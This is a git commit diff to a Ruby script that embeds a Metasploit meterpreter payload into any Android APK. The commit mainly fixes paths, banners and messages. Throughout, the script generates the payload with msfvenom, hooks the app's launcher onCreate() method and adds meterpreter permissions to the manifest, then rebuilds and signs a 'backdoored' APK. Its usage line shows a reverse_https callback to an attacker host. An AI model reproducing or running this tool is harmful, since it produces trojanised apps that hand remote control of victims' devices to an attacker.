6af339bea1e0ac83faf213c6b1a65388c8c78738
xC0d3rZ <xc0d3rz@users.noreply.github.com>
2016-07-20 14:03:32 +0300

    Fixing bugs
    * [Hooks not showing up](https://github.com/xc0d3rz/metasploit-apk-embed-payload/issues/2)
    * Paths errors
    * Push new Version

--- apk-embed-payload.rb
+++ apk-embed-payload.rb
@@ -1,34 +1,18 @@
 #!/usr/bin/env ruby
-# This script is a POC for injecting metasploit payloads on 
-# arbitrary APKs.
-# Authored by timwr, Jack64
-# Updated by xC0d3rZ
 require 'nokogiri'
 require 'fileutils'
 require 'optparse'
 require 'colorize'
 require 'securerandom'
 puts "
-    ▄▄▄▄  ▄▄▄▄▄▄▄▄▄▄▄  ▄▄▄▄▄▄▄▄▄▄▄  ▄▄▄▄▄▄▄▄▄▄  
-  ▄█░░░░▌▐░░░░░░░░░░░▌▐░░░░░░░░░░░▌▐░░░░░░░░░░▌ 
- ▐░░▌▐░░▌ ▀▀▀▀█░█▀▀▀▀ ▐░█▀▀▀▀▀▀▀▀▀ ▐░█▀▀▀▀▀▀▀█░▌
-  ▀▀ ▐░░▌     ▐░▌     ▐░▌          ▐░▌       ▐░▌
-     ▐░░▌     ▐░▌     ▐░▌          ▐░█▄▄▄▄▄▄▄█░▌
-     ▐░░▌     ▐░▌     ▐░▌          ▐░░░░░░░░░░▌ 
-     ▐░░▌     ▐░▌     ▐░▌          ▐░█▀▀▀▀▀▀▀█░▌
-     ▐░░▌     ▐░▌     ▐░▌          ▐░▌       ▐░▌
- ▄▄▄▄█░░█▄▄▄  ▐░▌     ▐░█▄▄▄▄▄▄▄▄▄ ▐░█▄▄▄▄▄▄▄█░▌
-▐░░░░░░░░░░░▌ ▐░▌     ▐░░░░░░░░░░░▌▐░░░░░░░░░░▌ 
- ▀▀▀▀▀▀▀▀▀▀▀   ▀       ▀▀▀▀▀▀▀▀▀▀▀  ▀▀▀▀▀▀▀▀▀▀  
-                                                 
+██╗  ██╗ ██████╗ ██████╗ ██████╗ ██████╗ ██████╗ ███████╗
+╚██╗██╔╝██╔════╝██╔═████╗██╔══██╗╚════██╗██╔══██╗╚══███╔╝
+ ╚███╔╝ ██║     ██║██╔██║██║  ██║ █████╔╝██████╔╝  ███╔╝ 
+ ██╔██╗ ██║     ████╔╝██║██║  ██║ ╚═══██╗██╔══██╗ ███╔╝  
+██╔╝ ██╗╚██████╗╚██████╔╝██████╔╝██████╔╝██║  ██║███████╗
+╚═╝  ╚═╝ ╚═════╝ ╚═════╝ ╚═════╝ ╚═════╝ ╚═╝  ╚═╝╚══════╝                                  
 ".cyan
-puts " " + "
-
- +-+-+-+-+-+-+-+-+ +-+-+-+-+".red + "
- |S|e|c|u|r|i|t|y| |T|e|a|m|".yellow + "
- +-+-+-+-+-+-+-+-+ +-+-+-+-+
-".red  + "\n"
-
+puts "[*] Authored by timwr, Jack64".blue + "&".cyan + "Updated by xC0d3rZ.".blue
 # Find the activity thatapk_backdoor.rb  is opened when you click the app icon
 def findlauncheractivity(amanifest)
     package = amanifest.xpath("//manifest").first['package']
@@ -54,9 +38,9 @@ end
 # If XML parsing of the manifest fails, recursively search
 # the smali code for the onCreate() hook and let the user
 # pick the injection point
-def scrapeFilesForLauncherActivity()
+def scrapeFilesForLauncherActivity(org_dir)
 	smali_files||=[]
-	Dir.glob('original/smali*/**/*.smali') do |file|
+	Dir.glob(org_dir+'/smali*/**/*.smali') do |file|
 	  checkFile=File.read(file)
 	  if (checkFile.include?";->onCreate(Landroid/os/Bundle;)V")
 		smali_files << file
@@ -65,9 +49,9 @@ def scrapeFilesForLauncherActivity()
 	  end
 	end
 	i=0
-	print "[*] Please choose from one of the following:\n"
+	puts "[*] Please choose from one of the following:".gray
 	smali_files.each{|s_file|
-		print "[+] Hook point ",i,": ",s_file,"\n"
+		puts "[+] Hook point ".brown+i+":",s_file,"\n"
 		i+=1
 	}
 	hook=-1
@@ -89,7 +73,6 @@ def scrapeFilesForLauncherActivity()
 	}
 	return [smalifile,activitysmali]
 end
-
 def fix_manifest(d_payload , d_original)
 	payload_permissions=[]
 	
@@ -123,7 +106,7 @@ def fix_manifest(d_payload , d_original)
 	add_permissions=[]
 	for permission in payload_permissions
 		if !(original_permissions.include? permission)
-			print "[*] Adding #{permission}\n"
+			puts "[*] Adding #{permission}".white
 			add_permissions << permission
 		end
 	end
@@ -147,14 +130,15 @@ def randomString(size = 6)
   charset = %w{ 2 3 4 6 7 9 A C D E F G H J K M N P Q R T V W X Y Z}
   (0...size).map{ charset.to_a[rand(charset.size)] }.join
 end
-output_dir = "tmp/"+randomString(6)
+work_dir = Dir.pwd+"/";
+output_dir = work_dir+"tmp/"+randomString(6)
 apkfile = ARGV[0]
-unless(apkfile || apkfile.length < 0)
+unless(apkfile)
     puts "[+] Usage: #{$0} {target.apk} [msfvenom options]".red + "\n"
 	puts "[+] e.g. #{$0} messenger.apk -p android/meterpreter/reverse_https LHOST=192.168.1.1 LPORT=8443".cyan
 	exit(1)
 end
-signapk = "embed_tools/signapk/signapk.jar"
+signapk = work_dir + "embed_tools/signapk/signapk.jar"
 unless(signapk && File.readable?(signapk))
 	puts "[+] Cannot find signapk tool".red
 	exit(1)
@@ -163,12 +147,12 @@ unless (File.readable?(apkfile))
 	puts "[-] Cannot find #{apkfile}".red + "\n";
 	exit(1);
 end
-apktool = "embed_tools/apktool.jar"
+apktool = work_dir + "embed_tools/apktool.jar"
 unless(apktool && File.readable?(apktool))
 	puts "[+] Cannot find apktool tool".red
 	exit(1)
 end
-apk_v= `embed_tools/apktool.sh -version`;
+apk_v= `$(pwd)/embed_tools/apktool.sh -version`;
 unless(apk_v.split()[0].include?("2."))
 	puts "[-] Apktool version #{apk_v} not supported, please download the latest 2. version from git.\n".red
 	exit(1)
@@ -195,56 +179,58 @@ f_original = "#{output_dir}/original.apk"
 f_signapk  = "#{output_dir}/signapk.apk"
 d_payload  = "#{output_dir}/payload"
 d_original = "#{output_dir}/original"
-puts "[1] Generating msfvenom payload.." + f_payload
+puts "[1] Generating msfvenom payload".yellow
 res=`msfvenom -f raw #{opts} -o #{f_payload} 2>&1`
 if res.downcase.include?("invalid" || "error")
 	puts res
 	exit(1)
 end
 
-print "[*] Signing payload..\n"
+puts "[2] Signing payload".yellow + "\n"
 `$(pwd)/embed_tools/signapk.sh #{f_payload} #{f_signapk}`
-
 `cp #{apkfile} #{f_original}`
-
-print "[*] Decompiling orignal APK..\n"
+puts "[3] Decompiling orignal APK".yellow + "\n"
 `$(pwd)/embed_tools/apktool.sh d #{f_original} -o #{d_original}`
-print "[*] Decompiling payload APK..\n"
+print "[4] Decompiling payload APK".yellow + "\n"
 `$(pwd)/embed_tools/apktool.sh d #{f_signapk} -o #{d_payload}`
 f = File.open(d_original+"/AndroidManifest.xml")
 amanifest = Nokogiri::XML(f)
 f.close
-print "[*] Locating onCreate() hook..\n"
+puts "[5] Locating onCreate() hook".yellow + "\n"
 launcheractivity = findlauncheractivity(amanifest)
 smalifile = d_original+'/smali/' + launcheractivity.gsub(/\./, "/") + '.smali'
 begin
 	activitysmali = File.read(smalifile)
 rescue Errno::ENOENT
-	print "[!] Unable to find correct hook automatically.\n"
+	puts "[!] Unable to find correct hook automatically.".red + "\n"
 	begin
-		results=scrapeFilesForLauncherActivity()
+		results=scrapeFilesForLauncherActivity(d_original)
 		smalifile=results[0]
 		activitysmali=results[1]
 	rescue
-		puts "[-] Error finding launcher activity. Exiting.".red +"\n"
+		puts "[-] Error finding launcher activity. Exiting.".red
 		exit(1)
 	end
 end
 
-print "[*] Copying payload files..\n"
+puts "[6] Copying payload files".yellow + "\n"
 FileUtils.mkdir_p("#{d_original}/smali/com/metasploit/stage/")
 FileUtils.cp Dir.glob("#{d_payload}/smali/com/metasploit/stage/Payload*.smali"), "#{d_original}/smali/com/metasploit/stage/"
 activitycreate = ';->onCreate(Landroid/os/Bundle;)V'
 payloadhook = activitycreate + "\n    invoke-static {p0}, Lcom/metasploit/stage/Payload;->start(Landroid/content/Context;)V"
 hookedsmali = activitysmali.gsub(activitycreate, payloadhook)
-print "[*] Loading ",smalifile," and injecting payload..\n"
+puts "[7] Loading ".yellow + File.basename(smalifile) + " and injecting payload".yellow + "\n"
 File.open(smalifile, "w") {|file| file.puts hookedsmali }
 injected_apk= "#{output_dir}/"+apkfile.split(".")[0]
 injected_apk+="_backdoored.apk"
-print "[*] Poisoning the manifest with meterpreter permissions..\n"
+puts "[8] Poisoning the manifest with meterpreter permissions".yellow + "\n"
 fix_manifest(d_payload,d_original)
-print "[*] Rebuilding #{apkfile} with meterpreter injection as #{injected_apk}..\n"
+puts "[9] Rebuilding #{apkfile} with meterpreter injection as ".yellow + File.basename(injected_apk)+ "\n"
 `$(pwd)/embed_tools/apktool.sh b -o $(pwd)/#{injected_apk} #{d_original}`
-print "[*] Signing #{injected_apk} ..\n"
+unless (File.readable?(injected_apk))
+puts "[-] Error creating injection APK,If you haven't Android-SDK please install it.".red
+exit(1);
+end
+puts "[10] Signing #{injected_apk}".yellow + "\n"
 `$(pwd)/embed_tools/signapk.sh #{injected_apk} $(pwd)/__{$apkfile}_backdoored.apk`
-puts "[+] Infected file __{$apkfile}_backdoored.apk ready.\n"
+puts "[11] Infected file __{$apkfile}_backdoored.apk ready.".green
